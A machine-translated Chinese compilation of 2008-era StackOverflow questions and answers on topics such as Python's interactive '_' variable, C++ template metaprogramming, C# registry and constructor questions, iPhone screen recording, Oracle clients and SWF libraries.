# StackOverflow 问答 000200000-000200999

# python - 在交互式 Python shell 中获取最后一个结果

> ID：200020
> 
> 赞同：180
> 
> 时间：2008-10-14T04:31:49.027
> 
> 标签：python

在许多符号数学系统中，例如 Matlab 或 Mathematica，您可以使用类似`Ans`或的变量`%`来检索最后计算的值。Python shell 中是否有类似的功能？

* * *

## 回答 #1

> 赞同：272
> 
> 时间：2008-10-14T04:35:08.630

下划线。

```
>>> 5+5
10
>>> _
10
>>> _ + 5
15
>>> _
15 
```

* * *

## 回答 #2

> 赞同：97
> 
> 时间：2008-10-14T04:53:38.483

仅作记录，ipython 更进一步，您可以使用 _ 及其数值访问每个结果

```
In [1]: 10
Out[1]: 10

In [2]: 32
Out[2]: 32

In [3]: _
Out[3]: 32

In [4]: _1
Out[4]: 10

In [5]: _2
Out[5]: 32

In [6]: _1 + _2
Out[6]: 42

In [7]: _6
Out[7]: 42 
```

也可以使用 %ed 宏编辑行范围：

```
In [1]: def foo():
   ...:     print "bar"
   ...:     
   ...:     

In [2]: foo()
bar

In [3]: %ed 1-2 
```

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2019-05-09T13:00:51.773

`_`IPython 允许您使用双下划线 ( `__`) 和三重下划线 ( )超越单下划线`___`，返回倒数第二个和倒数第三个命令的结果。

或者，您也可以使用`Out[n]`，其中`n`是生成输出的输入编号：

```
In [64]: 1+1
Out[64]: 2

...

In [155]: Out[64] + 3
Out[155]: 5 
```

有关详细信息，请参阅[https://jakevdp.github.io/PythonDataScienceHandbook/01.04-input-output-history.html](https://jakevdp.github.io/PythonDataScienceHandbook/01.04-input-output-history.html)。

# c++ - 程序员需要 C++ 元模板知识吗？

> ID：200032
> 
> 赞同：3
> 
> 时间：2008-10-14T04:43:23.853
> 
> 标签：c++, metaprogramming

以我的经验，元模板真的很有趣（当你的编译器兼容时），并且可以提供良好的性能提升，幸运的是，我周围都是经验丰富的 C++ 程序员，他们也熟悉元模板，但偶尔会有新的开发人员到来并且可以'不要对我们使用的一些元模板技巧（主要是 Andrei Alenxandrescu 的东西）做出正面或反面，持续几周，直到他得到适当的启动。

所以我想知道其他 C++ 程序员的情况如何？元模板编程是否应该是 C++ 程序员应该“必须”知道的（当然不包括入门级学生）？

编辑：注意我的问题与生产代码有关，而不是很少的样本或原型

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-14T05:00:04.163

如果你能找到足够多真正了解模板元编程的候选人，那么无论如何，都需要它。您将向许多合格且具有潜在生产力的人展示大门（有很多正当理由不知道如何做到这一点，即如果您在很多平台上这样做，您将创建无法编译的代码，否则普通开发人员将难以理解）。模板元编程很棒，但让我们面对现实吧，它把 C++ 推向了极限。现在，应聘者可能应该了解基础知识（在编译时计算 n！，或者至少在向他们展示代码时解释它是如何工作的）。如果您的新开发人员在几周内可靠地变得高效，那么您当前的招聘可能相当不错。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-14T05:00:33.057

是的，但我个人不会高度重视它。这是一个很好的特性，但它有点情景化，没有它也可以开发出好的 C++ 代码。我个人使用过一次或两次，但并没有真正发现它在*我的*工作中足够有价值以经常使用它。（也许这是我缺乏 C++ 生产经验的原因）

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-14T06:16:18.893

我在生产代码中使用模板元编程的唯一用途是展开一个关键循环，该循环读取硬件寄存器 N 次，然后是另一个 M 次，N，M 对于不同的硬件不同，并且在编译时已知。一般来说，这些技术似乎并不适合我们的代码库，而且我永远不会通过代码审查来获得它们。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-14T06:25:26.707

必需的？一如既往，这取决于。对于我们这些嵌入式领域的人来说，他们刚刚为我们的小型 DSP 获得了半体面的 C++ 编译器等等，我们很高兴能够使用类。

但是，如果你有一个不错的 C++ 编译器，比如 gcc 3.3ish+，那么是的，你应该看看模板元编程。一个好的开始当然是 boost 库，因为它涵盖了当 STL 耗尽气体时您似乎要四处寻找的大部分模板。它也是一个很好的起点。

然而，有时我发现模板元编程的优势（大量带有几行 < 和 > 的类型安全的代码）并不值得为此付出代价。有时，一个好的 for(container::const_iterator iter = ...) 可以很好地满足您的需求。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2010-04-13T18:18:21.670

18 个月后，这个话题仍然非常重要。我仍然会说模板元编程不是必需的知识，但是您至少需要能够阅读和解释诸如条件和奇怪重复的模板模式（循环）之类的基础知识。除此之外，只要你有几个人可以编写一个好的接口，那么真正需要的只是基本到中级的模板知识，尽管 YMMV。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-14T07:48:04.637

作为一个合理（虽然不是广泛）使用模板和元编程的人，我不遗余力地尝试使接口（我指的是内部使用接口）尽可能正常。不是每个人都能理解模板，甚至那些有时无法理解复杂或迟钝的元编程范式的人。

话虽如此，如果你想深入了解我的低级库，你将不得不知道很多。但是，您甚至不必知道模板（除了基线知识）即可使用它们。这就是我至少划清界限的方式，以及我期望其他开发人员的知识水平（取决于他们如何使用代码）。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-14T10:25:13.790

我不认为需要模板编程，但知道这绝对是件好事。您应该对该主题有足够的了解，以便能够有效地使用 STL 或 Boost 等模板库。

当我采访某人时，我总是会问一些关于模板元编程的问题。如果候选人不知道这个主题，我永远不会反对他们。但如果他们这样做，那么这对他们来说是一个很大的优势。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2008-10-14T05:31:19.827

知道如何使用 C++ 模板并不是绝对必要的。没有它们你可以做大部分事情。然而，它们是一个很棒的功能。

由于您推出了自己的模板，任何新人都必须跟上它们的速度，就像您的其他代码一样，这将是学习的更大部分。

我鼓励人们学习使用**STL**的一些特性。我在生产代码中使用了这个库，它确实节省了时间并简化了很多事情。当需要时，我也会自己滚动。

我也听说过关于**boost**库的好消息。

如果我需要编写可移植代码，那么我通常会远离模板，因为许多编译器仍然不能正确支持它们。如果你需要一个可移植的 STL，那么**STLPort**是最便携的。

# c# - 从 C# 中的添加/删除程序中删除应用程序的条目

> ID：200037
> 
> 赞同：2
> 
> 时间：2008-10-14T04:47:21.817
> 
> 标签：c#, .net, uninstallation

我开发了一个安装程序类，它从基本目录中删除某些文件夹。但是，我还想通过 inst 类从添加/删除程序中删除另一个应用程序的条目。任何人都可以提出解决方案。

问候， 苛刻的苏曼

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T04:50:49.860

从注册表中删除 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall 条目

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T13:10:05.567

此外，可能有一个条目需要从 HKEY_CLASSES_ROOT\Installer\Products 中删除

见[http://www.annoyances.org/exec/forum/winxp/t1073003127](http://www.annoyances.org/exec/forum/winxp/t1073003127)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-07-20T11:41:54.700

可能值得阅读此论坛主题： [http ://www.eggheadcafe.com/community/aspnet/2/10069013/uninstall-a-proram-by-using-c.aspx](http://www.eggheadcafe.com/community/aspnet/2/10069013/uninstall-a-proram-by-using-c.aspx)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-09-06T04:02:48.920

```
 public static void RemoveControlPanelProgram(string apllicationName)
    {
       string InstallerRegLoc = @"Software\Microsoft\Windows\CurrentVersion\Uninstall";
       RegistryKey homeKey = (Registry.LocalMachine).OpenSubKey(InstallerRegLoc, true);
       RegistryKey appSubKey = homeKey.OpenSubKey(apllicationName);
       if (null != appSubKey)
       {
         homeKey.DeleteSubKey(apllicationName);
       }
     } 
```

# iphone - 有没有办法可以将我的 iPhone 屏幕捕获为视频？

> ID：200049
> 
> 赞同：47
> 
> 时间：2008-10-14T04:54:30.900
> 
> 标签：iphone

我希望能够将我的 iPhone 屏幕捕获为视频，但我不确定最好的方法。

谁能帮助指导我如何在*不越狱的情况下最好地做到这一点？*

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2011-11-20T05:31:49.847

简而言之，这是我的解决方案：

近年来，当需要从iOS应用程序的界面制作动人的视觉内容时，我会要求开发者提供为模拟器设计的应用程序的编译，（必须单独编译，因为应用程序默认编译运行在 iPhone 的 ARM 处理器上运行，而 Simulator 在 Mac 的 Intel 处理器上运行）。然后，这将在 Mac 上使用 Snapz Pro、Screenflow 或类似的东西进行屏幕捕获。

除此之外，典型的解决方案需要越狱设备并安装来自 Cydia 商店的屏幕捕获应用程序。

随着 iPad 2 的推出，Apple 通过授权的底座连接器连接到 HDMI 加密狗，或通过底座连接器连接到 VGA 接收器，实现了全接口镜像视频输出。（注意：Apple 的复合和组件选项不移植镜像内容。）虽然这些输出机制的典型意图是将界面内容显示到外部投影仪或高清电视，但可以使用支持的设备记录此镜像内容记录或转码来自此类传入源的内容。随着 iPhone 4S 的推出，这一选项也成为可能。很多时候，录制此视频内容是使用安装在捕获计算机上的 HDMI 捕获卡完成的，例如由 Black Magic 或 AJA 生产的那些。这是，或当然仅限于使用能够安装此类采集卡的计算机。其他选项可能包括一些启用 HDMI 记录的 DVR 设备（尽管许多检测并禁用此类选项）或基于火线的转码设备（如我使用的 Grass Valley ADVC-HD50）。

自从今年早些时候获得 iPad 2 以来，我一直在使用 Grass Valley ADVC HD50 从底座连接的 HDMI 到我的 Mac 上与 HDV 兼容的视频捕获应用程序捕获 iOS 屏幕运动。迄今为止，它完美无缺。

这是我录制的视频中的一个示例，显示了从 iPHone 4S 和 iPad 2 捕获的此类内容。

[http://youtu.be/k7jlPx8NAmw](http://youtu.be/k7jlPx8NAmw)

不过，现在苹果在 iOS 5 中通过 Airplay 启用了无线 iOS 镜像，我发现现在将 Apple TV 设备连接到 Grass Vally ADVC HD50 并无线捕获 iOS 界面屏幕录制更加方便。

这是最近的一个短视频示例，其中通过 Airplay 镜像无线捕获 iPhone 4S 界面。

[http://youtu.be/UKsixjcCXdI](http://youtu.be/UKsixjcCXdI)

我希望这有帮助。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-05-14T16:23:32.273

正如其他人所建议的那样，AirPlay 镜像是要走的路。要直接镜像到您的计算机，请使用[http://www.airserverapp.com/](http://www.airserverapp.com/)之类的 AirPlay 服务器。然后，由于它直接显示在您的计算机上，您可以使用内置的 Quicktime 应用程序（文件 > 新屏幕录制）捕获它。效果很好！

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-10-22T10:33:28.280

您可以使用**[Lookback](http://lookback.io)**。它记录您的屏幕、面部、声音和所有手势，并将它们上传到您在网络上的帐户。

这是一个演示：[https ://lookback.io/watch/JK354d5jcEpA7CNkE](https://lookback.io/watch/JK354d5jcEpA7CNkE)

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2009-10-28T23:08:09.043

我为执行此操作的模拟器制作了一个插件。你可以在[我的博客](http://thinkultimate.com/2009/10/iphone-screen-capture/)上找到它。

它实际上记录了屏幕。它不依赖像 iShowU 这样的屏幕捕获程序。

它将为默认应用程序安装图标并将运营商文本更改为看起来像真实设备。

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2010-05-08T21:57:27.437

Tweetie2 的开发者 Loren Brichter 编写了这个名为 SimFinger 的小应用程序，以使 iphone 截屏视频一流！

[http://blog.atebits.com/2009/03/not-your-average-iphone-screencast/](http://blog.atebits.com/2009/03/not-your-average-iphone-screencast/)

喜欢让业余爱好者看起来像专业人士的应用程序 :)

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-10-14T05:50:45.217

没有使用摄像机，没有。

许多用于演示 iPhone 应用程序的 youtube 视频都是使用屏幕抓取应用程序（例如 iShowU、ScreenFlow 或 Snapz Pro）和模拟器制作的。请注意，模拟器中的响应速度可能与设备有很大的不同 - 因此，使用模拟器可能会获得您永远不会在设备上看到的效果（和错过）。特别是，默认动画可以在模拟器中闪现，它们在设备上看起来很快。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2012-04-11T11:19:53.090

使用 ScreenCaptureView 类，我们可以将 iphone 屏幕捕获为视频。源代码可[在此处](http://codethink.no-ip.org/wordpress/archives/673)获得。录制的视频保存在 NSUrl、outputURL 中。使用该 NSUrl 以如下方法播放录制的视频，

```
 -(void)playvideo
{

  MPMoviePlayerController *player = [[MPMoviePlayerController alloc] initWithContentURL:outputURL ];
       [player.view setFrame:CGRectMake(0,0,320,480)];

[player setMovieControlMode:MPMovieControlModeHidden];   

[player setScalingMode:MPMovieScalingModeAspectFit];

 [player setBackgroundColor:[UIColor blackColor]];

 [player setFullscreen:YES animated:YES];

[player play];

[self addSubview:player.view];

} 
```

在 completeRecordingSession 方法中释放 NSUrl 之前调用此方法..它将重播您在 iphone 屏幕上所做的事情作为视频。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-08-13T00:47:35.107

*注意：此答案已过时*

www.iphonevideorecorder.com。我认为有一个免费试用版，但之后你需要购买它。你需要越狱你的iphone。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2009-12-08T08:24:47.800

您可以使用视频输出并通过火线或总和以某种方式捕获它。 MPTVOutWindow 类**可以**帮助您！这是一个很好的示例！

**[http://iphone-developers-nc.googlegroups.com/web/UIApplication_TVOut.m](http://iphone-developers-nc.googlegroups.com/web/UIApplication_TVOut.m)**

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2011-04-21T03:59:26.550

我使用[ScreenFlow](http://www.telestream.net/screen-flow/overview.htm)来记录模拟器，并根据需要对其进行缩放并添加静态图像。然后我将电影嵌入到我网站上的 iPhone 框架中。结果还好。查看[Tweeps](http://www.dejal.com/tweeps/iphone/)页面以了解结果。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2011-11-03T23:51:53.697

我想现在已经很明显了

只需播放到苹果电视和视频镜像，然后将 atv 输出到可以录制的设备 - 如 tivo、dvr 等。您现在也可以在 iPad [1 和 2] 上使用视频输出电缆

不确定电缆是否适用于 iPhone 4S，因为我自己没有测试过

它笨重，但我没有其他办法可以看到自动取款机。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-10-17T18:20:23.437

我自己一直在继续研究这个项目，目前看来它确实超出了我们的范围。

我什至尝试购买[Apple Composite AV Cable](http://store.apple.com/us/product/MB129LL/A)，但它不捕获屏幕，只是像 YouTube 一样播放视频等。

所以我决定走 iShowU 的道路，到目前为止效果很好。

多谢你们！

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2010-03-02T06:29:13.977

如需好看的截屏视频，请查看[SimFinger](http://blog.atebits.com/2009/03/not-your-average-iphone-screencast/)。您仍然需要屏幕记录器，例如[Snapz Pro](http://www.ambrosiasw.com/utilities/snapzprox/)。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2013-05-23T07:46:53.687

仅适用于仍在寻找解决方案的任何人：

RecordMyScreen 越狱应用程序是开源的，如果我们拥有开发人员许可证，即使在非越狱设备上也能正常工作。你可以看一下源码：[https ://github.com/coolstar/RecordMyScreen](https://github.com/coolstar/RecordMyScreen)

* * *

## 回答 #15

> 赞同：-4
> 
> 时间：2008-10-14T05:43:34.310

我不相信这是可能的。您最好的选择是获取 iShowU 之类的东西并从模拟器中捕获。

# database - 在命令行上连接到 Oracle 数据库而不使用 Oracle 客户端软件？

> ID：200056
> 
> 赞同：7
> 
> 时间：2008-10-14T05:00:51.197
> 
> 标签：database, oracle, command-line, client

我可以访问具有一些我想访问的数据库的 Oracle 服务器。但是，我可以访问的机器没有任何 oracle 客户端软件。oracle 的客户端软件有什么替代品，可以提供 MySQL 的 mysql 或 Postgres 的 psql 之类的功能吗？在针对它编写软件之前，我希望能够在数据库中浏览一下。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-14T05:11:37.650

如果您下载**免费的** [Oracle Instant Client](http://www.oracle.com/technology/tech/oci/instantclient/index.html)，您将能够使用任何 JDBC 或 ODBC 数据库工具，例如[DbVisualizer](http://www.download.com/DbVisualizer/3000-10255_4-10202406.html)或[SquirrelSQL](http://www.squirrelsql.org/)。这些是 GUI 工具；我没有遇到过 JDBC 命令行工具，但可能有一个。

或者，有一个[即时客户端版本的 SQL*Plus](http://www.oracle.com/technology/docs/tech/sql_plus/10103/readme_ic.htm)，它会为您提供一个 Oracle`sqlplus`命令行，而无需完整的 Oracle 安装。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T13:48:11.163

Oracle 的免费 PL/SQL IDE [SQL Developer](http://www.oracle.com/technology/products/database/sql_developer/index.html)可以使用 Type 4 JDBC 驱动程序连接到许多不同类型的数据库，显然包括 Oracle。如果您愿意，您可以使用它而无需安装任何类型的 Oracle 客户端。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T14:24:43.510

您可以尝试免费[下载](http://www.oracle.com/technology/products/database/sql_developer/index.html)的 Oracle IDE SQL Developer 。它是用 Java 编写的，适用于 windows 和 linux。它是独立的，不需要安装 Oracle 客户端。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-15T13:47:53.270

SQLPal ( [http://www.sqlpal.com/](http://www.sqlpal.com/) ) 是一个轻量级的类似 SqlPlus 的 Windows 应用程序，不需要 oracle 客户端。

# c# - 如何获取安装操作系统的驱动器的名称？

> ID：200066
> 
> 赞同：11
> 
> 时间：2008-10-14T05:09:20.823
> 
> 标签：c#, .net

在 C# 中，如何获取安装操作系统的驱动器的名称？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2008-10-14T05:11:35.717

这应该为你做：

```
Path.GetPathRoot(Environment.SystemDirectory) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T06:05:29.477

所有其他环境属性都可以在 ms 本身找到：http: [//msdn.microsoft.com/en-us/library/system.environment_properties.aspx](http://msdn.microsoft.com/en-us/library/system.environment_properties.aspx)

SystemDirectory - 获取系统目录的完全限定路径。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-12-23T12:40:52.083

环境中有一个枚举“SpecialFolder”，我们可以在其中选择我们正在寻找的文件夹..

Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

# flash - 是否有任何用于生成 flash swf 文件或将 svg 转换为 swf 的库

> ID：200077
> 
> 赞同：4
> 
> 时间：2008-10-14T05:22:40.750
> 
> 标签：flash, svg

我想知道是否有人知道任何用于以编程方式创建 Flash swf 文件的库。

或用于从 svg 创建 swf。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-14T05:32:34.737

[这对于swfmill](http://swfmill.org/ "瑞士法郎")来说听起来是一项完美的工作，我想您会发现它可以让您同时将 SVG 转换为 SWF 并从代码创建 SWF 文件。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T05:36:00.830

[Ming](http://www.libming.org/)是用 C 语言编写的，可以生成 SWF 内容。[通过SWF 模块](http://search.cpan.org/~liscovius/SWF-0.4.0-beta6_02/)在 Perl 中有 Ming 的绑定，我相信它也可以与 PHP 一起使用。至于 SVG 到 SWF 的转换，看起来有一个[Python 程序](http://www.flashmagazine.com/news/detail/svg_to_swf_using_ming/)可以做到这一点，但听起来好像还是有点粗糙。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-30T02:47:48.947

您应该查看[SwfDotNet](http://sourceforge.net/projects/swfdotnet/)。它是在 .NET 中完成的。

这是一个例子，检查一下：

[如何即时将 JPEG 转换为 SWF](http://www.codeproject.com/KB/graphics/jpeg2swf.aspx)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-13T16:15:13.773

看来 swfmill 不如标准的 mxmlc 来转换和嵌入 SVG 文件。我在一些简单的文件上对其进行了测试，它丢失了所有颜色和字体信息。

对我来说，这个问题仍然是相关的，因为 mxmlc 也丢失了我的 SVG 文件的一些属性，主要是渐变......

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2010-06-22T13:18:34.930

您可以使用[Aspose.Flash](http://www.aspose.com/categories/.net-components/aspose.flash-for-.net/default.aspx)从头开始​​或从 SVG 文件创建 SWF 文件。您可以从程序员指南和演示中获得完整的帮助。您也可以在我们的论坛中就任何技术问题或疑虑提问。

我是 Aspose.Flash 团队的成员。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-09-15T11:52:53.227

这是一个早期项目，所以可能会有一些麻烦，但[Swiffotron](https://github.com/izb/Swiffotron)可以加载、修改、生成和组合 SWF 文件。

# c# - C# 中的继承树和受保护的构造函数

> ID：200079
> 
> 赞同：2
> 
> 时间：2008-10-14T05:24:10.263
> 
> 标签：c#, inheritance, protected

给定以下继承树，以有效的方式实现它的最佳方法是什么？

```
abstract class Foo<T> : IEnumerable<T>
{
    public abstract Bar CreateBar();
}

class Bar<T> : Foo<T>
{
    // Bar's provide a proxy interface to Foo's and limit access nicely.
    // The general public shouldn't be making these though, they have access
    // via CreateBar()
    protected Bar(Foo base)
    {
        // snip...
    }
}

class Baz<T> : Foo<T>
{
    public Bar CreateBar()
    {
        return new Bar(this);
    }
} 
```

这失败了：`'Bar.Bar()' is inaccessible due to its protection level`。

我不希望构造函数是公开的，只有继承自的类`Foo`才能创建`Bar`s。`Bar`是一个专门`Foo`的，任何类型的`Foo`都应该能够创建一个。公共内部在这里是一个“选项”，因为大多数预定义的扩展都`Foo`将在 DLL 内部，但我认为这是一个草率的答案，因为后来出现的任何人想要创建自己的`Foo`or类型`Baz`（即可能发生）将被默认`CreateBar()`实现卡住，这可能会也可能不会满足他们的需求。

也许有一种方法可以重构它以使其正常工作？我正在努力设计这个，所以它会起作用。

**编辑（更多信息）：**

稍微具体一点：Foo 正在实现 IEnumerable，长话短说，Bar 提供了相同的接口，但只针对该可枚举对象的有限子集。所有 Foo 都应该能够创建自己的子集（即 Bar）并返回它。但我不想让每个想要实现 Foo 的人都担心这个，因为 Bar 会做代理并担心限制范围等。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T06:05:40.350

好的，新的答案：

1.  将 Bar 拆分为一个接口和一个具体类。
2.  用 IBar 表示公共抽象方法。
3.  使 Bar 成为 Foo 中的私有嵌套类，实现 IBar。给它一个可以从 Foo 调用的内部构造函数。
4.  在 Foo 中编写一个受保护的方法，该方法从自身创建 Bar 的一个实例。从 Foo 派生的类可以用它来实现抽象方法，只要代理就够了，需要更复杂的类可以直接实现 IBar。您甚至可以将抽象方法更改为虚拟方法，并默认从“this”创建一个新 Bar。

编辑：对此的一种变体是使 Bar 成为Foo 内的*受保护*嵌套类，并具有公共构造函数。这样，任何派生类都可以自己实例化它，但没有不相关的类能够“看到”它。您仍然需要将接口与实现分开（以便接口可以是公共的），但我认为无论如何这是一件好事。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T05:32:14.583

您是否可以将 Baz 设为 Bar 中的嵌套类型？只有这样，您才能赋予它比其他方式更多的 Bar 访问权限。仅仅拥有相同的父类只能使其访问 Foo 的受保护成员，而 Foo 没有对 Bar 的特殊访问权限。我怀疑嵌套类型还有其他曲折的方法可以做到这一点，但实际上这对维护工程师来说会非常不愉快。

这是一个相当奇怪的设计，强制一个派生类创建从同一个基类派生的不同类的实例。这真的是你需要的吗？也许如果你把它放在更具体的术语中，那么提出替代设计会更容易。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T05:56:16.373

您可以通过 Foo 中的嵌套类型访问 Bar 的构造函数：

```
abstract class Foo<T> : IEnumerable<T>
{
  public abstract Bar<T> CreateBar();

  protected Bar<T> CreateBar(Foo<T> f) { return new FooBar(f); }

  private class FooBar : Bar<T> 
   { public FooBar(Foo<T> f) : base(f) {}   
   }
}

class Bar<T> : Foo<T>
{ protected Bar(Foo<T> @base) {}
}

class Baz<T> : Foo<T>
{
    public override Bar<T> CreateBar() 
    {
        return CreateBar(this);
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T06:19:30.430

暂时忘记 Bar 源自 Foo。如果你这样做，听起来问题是“我如何才能让 Foo 的每个子类都可以创建一个 Bar，即使子类无法访问 Bar 的构造函数？”

这是一个很容易解决的问题：

```
public class Foo
{
   protected static Bar CreateBarInstance()
   {
      return new Bar();
   }
   public virtual Bar CreateBar()
   {
      return CreateBarInstance();
   }
}

public class Bar
{
    internal Bar()
    {
    }
}

public class Baz : Foo
{
    public override Bar CreateBar()
    {
        Bar b = base.CreateBar();
        // manipulate the Bar in some fashion
        return b;
    }
} 
```

如果要*保证*Foo 的子类无法访问 Bar 的构造函数，请将它们放在不同的程序集中。

现在，要从 Foo 派生 Bar，这是一个简单的更改：

```
public class Bar : Foo
{
    internal Bar()
    {
    }
    public override Bar CreateBar()
    {
        throw new InvalidOperationException("I'm sorry, Dave, I can't do that.");
    }

} 
```

“我不希望构造函数公开。” 查看。

“只有继承自 Foo 的类才能创建 Bars。” 查看。

“任何类型的 Foo 都应该能够创建一个。” 查看，

“后来出现的任何想要创建自己的 Foo 或 Baz 类型（这很可能发生）的人都将被默认的 CreateBar() 实现所困，这可能会或可能不会满足他们的需求。” 我认为这在很大程度上取决于 Foo.CreateBar() 方法中必须发生的事情。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T05:49:40.460

C# 不提供 C++ 朋友关键字的直接等效项。似乎您的设计需要这种构造。

在 C++ 中，您可以使用“朋友”指定特定类可以访问另一个类的私有/受保护成员。注意：这与 C# internal, 修饰符不同，后者允许访问同一程序集中的所有类。

查看您的设计，您似乎正在尝试按照需要 C++ 风格朋友的方式做一些事情。Jon Skeet 是对的，C# 中通常的设计是使用嵌套类来弥补这一点。

此[论坛帖子](http://bytes.com/forum/thread235936.html)进一步解释并展示了一些如何执行此操作的示例。

# php - 针对小组项目的 Web 应用程序的建议

> ID：200080
> 
> 赞同：0
> 
> 时间：2008-10-14T05:24:22.930
> 
> 标签：php, web-applications

我正在做计算机科学的第二年，我们有一个软件工程小组项目。组里有 5 个人，我们想用 php 构建一个 web 应用程序。请为我提出一些想法

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-14T15:45:15.670

看看 Paul Graham 的“我们愿意资助的创业点子”列表——更多点子和 CMS 已经完成了。

[http://ycombinator.com/ideas.html](http://ycombinator.com/ideas.html)

简短的清单：

1.  一种治疗以 RIAA 为症状的疾病的方法。
2.  简化浏览
3.  新消息
4.  外包 IT
5.  企业软件2.0
6.  CRM 的更多变体
7.  贵公司需要但不存在的东西
8.  约会
9.  照片/视频共享服务
10.  拍卖
11.  网络办公应用
12.  修复广告
13.  在线学习
14.  测量工具
15.  现成的安全性
16.  一种取决于设计的搜索形式
17.  新的付款方式（棘手）
18.  WebOS（si tienes 'webos'，抱歉的西班牙语笑话）
19.  应用程序和/或数据托管
20.  导购
21.  适用于个人和小型企业的财务软件
22.  基于 Web 的 Excel/数据库混合
23.  维基百科更开放的替代品
24.  对不良客户服务的缓冲
25.  ACraigslist 竞争对手
26.  更好的视频聊天
27.  硬件/软件混合体
28.  修复电子邮件过载
29.  针对特定市场的简易网站建设者
30.  初创公司的初创公司

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-14T05:44:28.770

[内容管理系统](http://en.wikipedia.org/wiki/Content_management_system)怎么样？

这使您可以展示您的 Web 开发技能的每一个部分，并且对于 5 人团队应该不难做到。CMS 通常包括文件上传、文件管理和在线文本编辑器（类似于 TinyMCE）。

它们的开发实际上非常有趣，并且当系统完成后，它有一个很棒的“哇”因素。尤其是当您向人们展示如何在线编辑网站内容时。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-14T05:46:20.483

### 想法：开发一个“小组项目贡献跟踪/报告”应用程序。我建议您对少数用户进行 Beta 测试 - 可能是五 (5) 个左右。

可能包括以下因素：编写的代码行、时间 QA 测试、生成的用例索引卡的数量等。

哦，如果你想完全主观 - 在声誉系统中工作。

* * *

我有点讽刺，但谁知道呢，也许那里有什么东西。

严肃地说-项目中一切顺利。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-10-14T06:08:53.213

我的第二年项目实际上是大学建议的，因为它满足了他们的需求。

我们创建了我们大学学生团体和教职员工的照片目录。

然后我们还将它链接到课程列表和教师信息。

最后，我们为用户和帐户创建了用户身份验证。

最终功能允许学生登录、编辑他们自己的信息（必须由工作人员批准），并在信息访问受限的情况下浏览目录。即，他们可以访问肖像肖像、居住扩展名和姓名。他们也可以选择对其他学生不可见。

教师可以登录，除上述之外，还可以查看班级内学生的画廊。这使他们可以打印出一本小册子，这样他们就可以开始将姓名与班级中的面孔联系起来。

它是用 Java 企业版编写的……有点像野兽。如果我要重新实现，我会用 PHP5 重写它。如果不是为了课程学分，我会使用 Drupal 构建它。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-14T05:52:34.400

你们可以按照[Buxfer](http://www.buxfer.com/)或[Mint](http://www.mint.com/)或[Quicken Online](http://quicken.intuit.com/online-banking-finances.jsp)的方式创建一些东西。

我自己正在为桌面开发一个这样的项目（爱好）。

您所要做的就是解析 OFX 语句，将它们存储在数据库中。

允许用户标记交易并设置预算。

允许多个银行/信用卡账户。

显示带有饼图的漂亮报告，有助于有意义地可视化数据。

对这些数字进行一些基本分析（“平均而言，您每 6 个月在不需要的电子产品上花费 500 美元”）。

数据库设计完成后，您可以并行处理许多这些功能。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-14T06:17:33.023

为什么不与其他学科的教授/讲师讨论他们可能需要的东西。

对于我的项目，我们就是这样做的，并创建了一个简单的系统来跟踪艺术部门照片实验室的实验室工作人员的日程安排。都是 PHP3 :)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-15T13:15:46.830

**下学期我应该安排哪些课程？**

给定课程表和学生资料，学生在下学期应该注册哪些课程？考虑专业、课程先决条件和个人限制，例如排除在工作或实践上花费的时间。

